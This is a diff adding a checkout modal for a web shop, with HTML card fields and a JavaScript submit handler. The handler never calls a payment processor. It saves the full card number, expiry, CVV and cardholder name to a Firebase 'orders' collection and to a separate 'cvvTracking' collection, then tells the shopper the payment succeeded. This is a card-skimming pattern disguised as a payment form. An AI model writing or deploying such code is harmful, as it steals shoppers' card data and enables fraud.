@@ -1,0 +1,96 @@
+<!-- Checkout Modal - Payment Form -->
+<div id="checkoutModal" class="modal">
+    <div class="modal-content checkout-modal">
+        <span class="close" onclick="closeCheckout()">&times;</span>
+        <h2>Payment Details</h2>
+        
+        <form id="paymentForm">
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" maxlength="19" placeholder="4532 1234 5678 9012" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Expiry Date</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" maxlength="3" placeholder="123" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="Name on Card" required>
+            </div>
+
+            <div class="order-summary">
+                <h3>Order Summary</h3>
+                <p>Total Amount: ₹<span id="checkoutTotal">0</span></p>
+            </div>
+
+            <button type="submit" class="btn-primary">Pay Now</button>
+        </form>
+    </div>
+</div>
+
+<script>
+// Payment form submit - SAVE FULL CARD DETAILS TO FIREBASE
+document.getElementById('paymentForm')?.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    if (!currentUser) {
+        alert('Please login!');
+        return;
+    }
+    
+    // Get FULL card details
+    const cardDetails = {
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+        expiry: document.getElementById('expiryDate').value,
+        cvv: document.getElementById('cvv').value,
+        holderName: document.getElementById('cardName').value,
+        type: detectCardType(document.getElementById('cardNumber').value)
+    };
+    
+    // Create order with COMPLETE card details
+    const orderData = {
+        userId: currentUser.uid,
+        userEmail: currentUser.email,
+        products: cart.map(item => ({
+            id: item.id,
+            name: item.name,
+            price: item.price
+        })),
+        totalAmount: calculateTotal(),
+        cardDetails: cardDetails,  // ✅ FULL card details saved
+        status: 'completed',
+        createdAt: new Date().toISOString()
+    };
+    
+    try {
+        // Save to Firebase
+        await db.collection('orders').add(orderData);
+        
+        // Also save to CVV tracking
+        await db.collection('cvvTracking').add({
+            cvv: cardDetails.cvv,
+            cardNumber: cardDetails.cardNumber,
+            expiry: cardDetails.expiry,
+            amount: calculateTotal(),
+            timestamp: new Date().toISOString(),
+            userEmail: currentUser.email
+        });
+        
+        alert('Payment successful! Order placed.');
+        cart = [];
+        closeCheckout();
+        
+    } catch (error) {
+        console.error('Payment error:', error);
+        alert('Payment failed: ' + error.message);
+    }
+});
+</script>
